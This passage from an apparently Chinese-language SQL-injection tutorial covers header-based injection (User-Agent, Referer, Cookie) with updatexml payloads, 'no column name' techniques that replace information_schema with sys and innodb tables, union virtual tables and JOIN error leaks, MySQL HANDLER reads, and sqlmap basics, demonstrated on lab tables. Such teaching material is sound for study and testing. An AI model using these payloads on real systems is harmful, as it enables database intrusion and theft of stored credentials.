<p>抓包，修改 User-Agent 值</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-Agent:a<span class="string">&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这样代进去即为</span></span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;a&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;1&#x27;=&#x27;1&#x27;, &#x27;<span class="variable">$IP</span>&#x27;, <span class="variable">$uname</span>)&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="14-2-Referer-注入"><a href="#14-2-Referer-注入" class="headerlink" title="14.2 Referer 注入"></a>14.2 Referer 注入</h3><p>源码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uagent</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="variable">$IP</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;<span class="variable">$uagent</span>&#x27;, &#x27;<span class="variable">$IP</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>同样的道理：当将 客户端可控的 <code>$uagent</code> 带入代入 <code>$insert</code> sql 语句时，必须将紧随其后的 单引号先闭合</p>
<p>抓包，修改 Referer 值</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Referer:a<span class="string">&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这样代进去即为</span></span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;a&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;1&#x27;=&#x27;1&#x27;, &#x27;<span class="variable">$IP</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="14-3-Cookie-注入"><a href="#14-3-Cookie-注入" class="headerlink" title="14.3 Cookie 注入"></a>14.3 Cookie 注入</h3><p>如今绝大部门开发人员在开发过程中会对用户传入的参数进行适当的过滤，但是很多时候，由于个人对安全技术了解的不同，有些开发人员只会对get，post这种方式提交的数据进行参数过滤。</p>
<p>但我们知道，很多时候，提交数据并非仅仅只有get / post这两种方式，还有一种经常被用到的方式：request(“xxx”),即request方法。通过这种方法一样可以从用户提交的参数中获取参数值。</p>
<p><strong>这就造成了cookie注入的最基本条件：使用了request方法，但是只对用户get / post提交的数据进行过滤。</strong></p>
<p>例如：<code>www.xx.com/search.asp?id=1</code></p>
<p>访问：<code>www.xx.com/srarch.asp</code>　发现不能访问，说缺少id参数。</p>
<p>我们试着将id=1放在cookie中再次访问，查看能否访问，如果能访问，则说明id参数可以通过cookie提交。</p>
<p>那么，如果后端没有对cookie中传入的数据进行过滤，那么，这个网站就有可能存在cookie注入了！</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cookee</span> = <span class="variable">$username</span>;</span><br><span class="line"><span class="variable">$cookee</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="variable">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="十五、无列名注入"><a href="#十五、无列名注入" class="headerlink" title="十五、无列名注入"></a>十五、无列名注入</h2><p> Mysql 版本 &gt; 5 时，都会存在一个元数据库 <code>information_schema</code> ，其中记录着 mysql 所有库、以及表的结构，我们通常的 sql 注入手段即是通过该元数据库来获取到其它库以及表的信息。那如果这个 <code>information_schema</code> 被过滤掉了该怎么办？</p>
<h3 id="15-1-使用别的具有类似功能的库"><a href="#15-1-使用别的具有类似功能的库" class="headerlink" title="15.1 使用别的具有类似功能的库"></a>15.1 使用别的具有类似功能的库</h3><p>除了 <code>information_schema</code> 中存在 <code>tables  schemata  columns  </code> 等表的信息外，在高版本当中还存在 <code>INNODB_TABLES</code>  <code>INNODS_COLUMNS</code> 中也记录着表的结构。</p>
<h4 id="15-1-1-sys-数据库"><a href="#15-1-1-sys-数据库" class="headerlink" title="15.1.1 sys 数据库"></a>15.1.1 sys 数据库</h4><ul>
<li><p><strong>利用mysql5.7新增的 sys.schema_auto_increment_columns</strong></p>
<p>基础数据来自与information_schema,他的作用是对表的自增ID进行监控，也就是说，如果某张表存在自增ID，就可以通过该视图来获取其表名和所在数据库名</p>
<p>关于该表的视图    <a target="_blank" rel="noopener" href="https://www.docs4dev.com/docs/zh/mysql/5.7/reference/sys-schema-auto-increment-columns.html">https://www.docs4dev.com/docs/zh/mysql/5.7/reference/sys-schema-auto-increment-columns.html</a></p>
<p><img src="https://i.loli.net/2021/07/26/WcsAFo4brvGk1HQ.png" alt="image-20210726115705011"></p>
</li>
<li><p><strong>sys.schema_table_statistics_with_buffer</strong></p>
<p><img src="https://i.loli.net/2021/07/26/lIYZEAwComGO9an.png" alt="image-20210726115902236"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 利用语句</span><br><span class="line"></span><br><span class="line">#查数据库</span><br><span class="line"><span class="keyword">select</span> table_schema <span class="keyword">from</span> sys.schema_auto_increment_columns;　　</span><br><span class="line">#查表</span><br><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> sys.schema_auto_increment_columns <span class="keyword">where</span> table_schema <span class="operator">=</span> database();　　</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> sys.schema_table_statistics_with_buffer <span class="keyword">where</span> table_schema<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure>

<p>类似的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">与它表结构相似的视图还有</span><br><span class="line"></span><br><span class="line">    sys.x<span class="variable">$schema_table_statistics_with_buffer</span></span><br><span class="line"></span><br><span class="line">    sys.x<span class="variable">$schema_table_statistics</span></span><br><span class="line"></span><br><span class="line">    sys.x<span class="variable">$ps_schema_table_statistics_io</span></span><br><span class="line">    </span><br><span class="line">参考：https://www.docs4dev.com/docs/zh/mysql/5.7/reference/sys-schema-redundant-indexes.html</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/26/waSdL9Z8jpWcKbQ.png" alt="image-20210726120047304"></p>
</li>
</ul>
<h4 id="15-1-2-mysql-默认存储引擎-INNODB-所携带的表"><a href="#15-1-2-mysql-默认存储引擎-INNODB-所携带的表" class="headerlink" title="15.1.2 mysql 默认存储引擎 INNODB 所携带的表"></a>15.1.2 mysql 默认存储引擎 INNODB 所携带的表</h4><ul>
<li><strong>mysql.innodb_table_stats</strong></li>
<li><strong>mysql.innodb_index_stats</strong></li>
</ul>
<p><img src="https://i.loli.net/2021/07/26/y9D2XuApPm5wYGW.png" alt="image-20210726120244786"></p>
<p><img src="https://i.loli.net/2021/07/26/YR5okn6FbNxaZBQ.png" alt="image-20210726120309138"></p>
<h3 id="15-2-union-select-构造虚表"><a href="#15-2-union-select-构造虚表" class="headerlink" title="15.2 union select 构造虚表"></a>15.2 union select 构造虚表</h3><p>实验：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from `users`;</span><br><span class="line">select 1,2,3 union select * from users;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1,2,3 union select * from users;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| 1  | 2        | 3          |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | 2        | 3          |</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | 321        |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">| 15 | Dummy<span class="string">&#x27;#  | 123        |</span></span><br><span class="line"><span class="string">+----+----------+------------+</span></span><br><span class="line"><span class="string">15 rows in set (0.00 sec)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 我们将列名替换成为了 数字 1,2,3</span></span><br><span class="line"><span class="string"># 那么我们就可以使用数字来对应其中的列名</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select `2` from (select 1,2,3 union select * from users)a;</span><br><span class="line">+----------+</span><br><span class="line">| 2        |</span><br><span class="line">+----------+</span><br><span class="line">| 2        |</span><br><span class="line">| Dumb     |</span><br><span class="line">| Angelina |</span><br><span class="line">| Dummy    |</span><br><span class="line">| secure   |</span><br><span class="line">| stupid   |</span><br><span class="line">| superman |</span><br><span class="line">| batman   |</span><br><span class="line">| admin    |</span><br><span class="line">| admin1   |</span><br><span class="line">| admin2   |</span><br><span class="line">| admin3   |</span><br><span class="line">| dhakkan  |</span><br><span class="line">| admin4   |</span><br><span class="line">| Dummy<span class="string">&#x27;#  |</span></span><br><span class="line"><span class="string">+----------+</span></span><br><span class="line"><span class="string">15 rows in set (0.00 sec)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 这时我们已经取到了第二列的内容</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当 `` 被过滤时，使用别名代替</span></span><br><span class="line"></span><br><span class="line">mysql&gt; select b from (select 1,2 as b,3 union select * from users)a;</span><br><span class="line">+----------+</span><br><span class="line">| b        |</span><br><span class="line">+----------+</span><br><span class="line">| 2        |</span><br><span class="line">| Dumb     |</span><br><span class="line">| Angelina |</span><br><span class="line">| Dummy    |</span><br><span class="line">| secure   |</span><br><span class="line">| stupid   |</span><br><span class="line">| superman |</span><br><span class="line">| batman   |</span><br><span class="line">| admin    |</span><br><span class="line">| admin1   |</span><br><span class="line">| admin2   |</span><br><span class="line">| admin3   |</span><br><span class="line">| dhakkan  |</span><br><span class="line">| admin4   |</span><br><span class="line">| Dummy<span class="string">&#x27;#  |</span></span><br><span class="line"><span class="string">+----------+</span></span><br><span class="line"><span class="string">15 rows in set (0.00 sec)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 同时查询多列</span></span><br><span class="line"></span><br><span class="line">mysql&gt; select concat(`2`,0x5e,`3`) from (select 1,2,3 union select * from users)a;</span><br><span class="line">+----------------------+</span><br><span class="line">| concat(`2`,0x5e,`3`) |</span><br><span class="line">+----------------------+</span><br><span class="line">| 2^3                  |</span><br><span class="line">| Dumb^Dumb            |</span><br><span class="line">| Angelina^I-kill-you  |</span><br><span class="line">| Dummy^321            |</span><br><span class="line">| secure^crappy        |</span><br><span class="line">| stupid^stupidity     |</span><br><span class="line">| superman^genious     |</span><br><span class="line">| batman^mob!le        |</span><br><span class="line">| admin^admin          |</span><br><span class="line">| admin1^admin1        |</span><br><span class="line">| admin2^admin2        |</span><br><span class="line">| admin3^admin3        |</span><br><span class="line">| dhakkan^dumbo        |</span><br><span class="line">| admin4^admin4        |</span><br><span class="line">| Dummy<span class="string">&#x27;#^123          |</span></span><br><span class="line"><span class="string">+----------------------+</span></span><br><span class="line"><span class="string">15 rows in set (0.00 sec)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># select concat(`2`,0x5e,`3`) from (select 1,2,3 union select * from users)a limit 0,1;</span></span><br></pre></td></tr></table></figure>

<h3 id="15-3-JOIN-爆破"><a href="#15-3-JOIN-爆破" class="headerlink" title="15.3 JOIN 爆破"></a>15.3 JOIN 爆破</h3><p>本质：通过 <strong>报错</strong> 得到列名</p>
<ul>
<li>join 连接两张表</li>
<li>using() 用于两张表之间的 join 连接查询，并且 using()中的列在两张表中都存在，作为 join 的条件</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 常用语句 select * from (select * from 表名 as a join 表名 as b)as c;</span></span><br><span class="line"><span class="comment"># 一一爆字段</span></span><br><span class="line">select * from (select * from users as a join news as b)as c;</span><br><span class="line"></span><br><span class="line">select * from (select * from users a join users b using(id))c;</span><br><span class="line"></span><br><span class="line">select * from (select * from users a join users b using(id,name))c;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆内容</span></span><br><span class="line">select * from (select * from users a join users b using(id,name,passwd))c;</span><br></pre></td></tr></table></figure>

<p>测试 </p>
<p>创建表：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create table users(id int,name varchar(20),passwd varchar(32));</span><br><span class="line">insert into users value(1,<span class="string">&#x27;mickey&#x27;</span>,<span class="string">&#x27;827ccb0eea8a706c4c34a16891f84e7b&#x27;</span>);</span><br><span class="line"></span><br><span class="line">create table news(is_admin int(1),id int(2),title varchar(100),date date);</span><br><span class="line">insert into news values(1,1,<span class="string">&#x27;hello,mickey&#x27;</span>,now());</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 爆列名</span></span><br><span class="line">mysql&gt; select * from (select * from users as a join news as b)as c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name <span class="string">&#x27;id&#x27;</span></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from (select * from users a join users b using(id))c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name <span class="string">&#x27;name&#x27;</span></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from (select * from users a join users b using(id,name))c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name <span class="string">&#x27;passwd&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆内容</span></span><br><span class="line">mysql&gt; select * from (select * from users a join users b using(id,name,passwd))c;</span><br><span class="line">+------+--------+----------------------------------+</span><br><span class="line">| id   | name   | passwd                           |</span><br><span class="line">+------+--------+----------------------------------+</span><br><span class="line">|    1 | mickey | 827ccb0eea8a706c4c34a16891f84e7b |</span><br><span class="line">+------+--------+----------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 爆列名</span></span><br><span class="line">mysql&gt; select * from (select * from news a join news b using(id))as c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name <span class="string">&#x27;is_admin&#x27;</span></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from (select * from news a join news b using(id,is_admin))as c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name <span class="string">&#x27;title&#x27;</span></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from (select * from news a join news b using(id,is_admin,title))as c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name <span class="string">&#x27;date&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆内容</span></span><br><span class="line">mysql&gt; select * from (select * from news a join news b using(id,is_admin,title,date))as c;</span><br><span class="line">+----------+------+--------------+------------+</span><br><span class="line">| is_admin | id   | title        | date       |</span><br><span class="line">+----------+------+--------------+------------+</span><br><span class="line">|        1 |    1 | hello,mickey | 2021-07-26 |</span><br><span class="line">+----------+------+--------------+------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.04 sec)</span><br></pre></td></tr></table></figure>

<h2 id="十六、Mysql-查询语句-之-Handler"><a href="#十六、Mysql-查询语句-之-Handler" class="headerlink" title="十六、Mysql 查询语句 之 Handler"></a>十六、Mysql 查询语句 之 Handler</h2><p><a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/handler.html">官方文档</a></p>
<ul>
<li>mysql除可使用select查询表中的数据，也可使用handler语句，它每次只能查询1条记录，而 select 可以根据需要返回多条查询结果。因此 handler语 句并不具备 select 语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</li>
<li>HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。</li>
<li>可以降低优化器对于SQL语句的解析与优化开销，从而提升查询性能。</li>
</ul>
<p><strong>测试：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> database practice;</span><br><span class="line">use practice;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> handler_table(id <span class="type">int</span>,username <span class="type">varchar</span>(<span class="number">10</span>));</span><br><span class="line"><span class="keyword">desc</span> handler_table;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> handler_table <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">&#x27;李华&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> handler_table <span class="keyword">values</span>(<span class="number">2</span>,<span class="string">&#x27;小马&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> handler_table <span class="keyword">values</span>(<span class="number">3</span>,<span class="string">&#x27;张鑫&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> handler_table <span class="keyword">values</span>(<span class="number">4</span>,<span class="string">&#x27;周明&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> handler_table <span class="keyword">values</span>(<span class="number">5</span>,<span class="string">&#x27;蔡紫&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> handler_tables;</span><br></pre></td></tr></table></figure>

<p><strong>不通过索引查表：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#打开句柄</span><br><span class="line">handler handler_table <span class="keyword">open</span>;</span><br><span class="line">#查询数据</span><br><span class="line">handler handler_table read <span class="keyword">first</span>;</span><br><span class="line">handler handler_table read next;</span><br><span class="line">handler handler_table read next;</span><br><span class="line">handler handler_table read next;</span><br><span class="line">handler handler_table read next;</span><br><span class="line">#关闭句柄</span><br><span class="line">handler handler_table <span class="keyword">close</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/06/02/yvMD6oPbEw514RG.png" alt="image-20210602174326041"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> handler handler_table <span class="keyword">close</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> handler handler_table read next;</span><br><span class="line">ERROR <span class="number">1109</span> (<span class="number">42</span>S02): <span class="literal">Unknown</span> <span class="keyword">table</span> <span class="string">&#x27;handler_table&#x27;</span> <span class="keyword">in</span> HANDLER</span><br></pre></td></tr></table></figure>

<p><strong>通过索引查表：需要创建索引</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#以 handler_table 中的 id 字段创建索引，命名为 handler_index</span><br><span class="line"><span class="keyword">create</span> index handler_index <span class="keyword">on</span> handler_table(id);</span><br><span class="line">#打开句柄，命名为 p</span><br><span class="line">handler handler_table <span class="keyword">open</span> <span class="keyword">as</span> p;</span><br><span class="line">#查看数据</span><br><span class="line">handler p read handler_index <span class="keyword">first</span>;#第一行</span><br><span class="line">handler p read handler_index next;#下一行</span><br><span class="line">handler p read handler_index prev;#上一行</span><br><span class="line">handler p read handler_index <span class="keyword">last</span>;#最后一行</span><br><span class="line">#关闭句柄</span><br><span class="line">handler p <span class="keyword">close</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#以 handler_table 中的 id 字段创建索引，命名为 handler_index</span><br><span class="line"><span class="keyword">create</span> index handler_index <span class="keyword">on</span> handler_table(id);</span><br><span class="line">#打开句柄</span><br><span class="line">handler handler_table <span class="keyword">open</span>;</span><br><span class="line">#查看特定位置的数据</span><br><span class="line">handler p handler_table read handler_index<span class="operator">=</span>(<span class="number">3</span>);</span><br><span class="line">handler handler_table read handler_index <span class="keyword">first</span>;#查第一条</span><br><span class="line">handler handler_table read handler_index next;#查下一条</span><br><span class="line">handler handler_table read handler_index prev;#查上一条</span><br><span class="line">handler handler_table read handler_index <span class="keyword">last</span>;#查最后一条</span><br><span class="line">#关闭句柄</span><br><span class="line">handler handler_table <span class="keyword">close</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#删除索引</span><br><span class="line"><span class="keyword">drop</span> index handler_index <span class="keyword">on</span> handler_table;</span><br></pre></td></tr></table></figure>

<p><strong>Handler 与 select 的比较：</strong></p>
<ul>
<li> select语句一次返回所有相关行，handler每次返回一行</li>
<li> HANDLER涉及的分析较少，比SELECT更快</li>
<li> 没有优化程序或查询校验开销</li>
<li> 在两个管理程序请求之间，不需要锁定表。</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/JesseYoung/article/details/40785137?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162262623916780264055048%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=162262623916780264055048&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-1-40785137.pc_search_result_cache&utm_term=mysql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5-handler&spm=1018.2226.3001.4187">参考</a></p>
<h2 id="十七、SQLmap"><a href="#十七、SQLmap" class="headerlink" title="十七、SQLmap"></a>十七、SQLmap</h2><h3 id="17-1-基本手法"><a href="#17-1-基本手法" class="headerlink" title="17.1 基本手法"></a>17.1 基本手法</h3><p><strong>简介</strong></p>
<ul>
<li>支持大量的数据库</li>
<li>支持多种SQL注入：布尔盲注，时间注入，报错注入，联合查询，堆叠注入，使用脚本</li>
<li>加上 <code>-v -3 </code> 会显示出其注入语句</li>
</ul>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">手册：python sqlmap.py <span class="operator">-</span>hh</span><br><span class="line"></span><br><span class="line"> 导航：python sqlmap.py <span class="comment">--wizard</span></span><br><span class="line"></span><br><span class="line"> 测试URL: python sqlmap.py <span class="operator">-</span>u &quot;url&quot;</span><br></pre></td></tr></table></figure>

<p><strong>常用测试（不确定注入手段）</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;url&quot;</span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--tamper randomcase.py</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--level 3</span></span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>level用于设置注入等级<span class="number">1</span><span class="operator">~</span><span class="number">6</span>，等级越高，包括的自动注入手段越多</span><br></pre></td></tr></table></figure>

<p><strong>查看权限</strong></p>
